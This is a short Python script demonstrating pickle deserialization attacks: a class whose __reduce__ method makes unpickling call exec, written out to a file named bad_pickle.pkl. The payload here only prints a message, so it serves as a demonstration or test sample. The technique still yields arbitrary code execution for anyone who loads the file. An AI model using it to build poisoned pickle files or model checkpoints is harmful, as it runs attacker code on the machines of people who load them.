import pickle

class Malicious:
    def __reduce__(self):
        return exec, ("print('Bad Pickle executes arbitrary python code')",)


with open("bad_pickle.pkl", "wb") as f:
    pickle.dump(Malicious(), f)
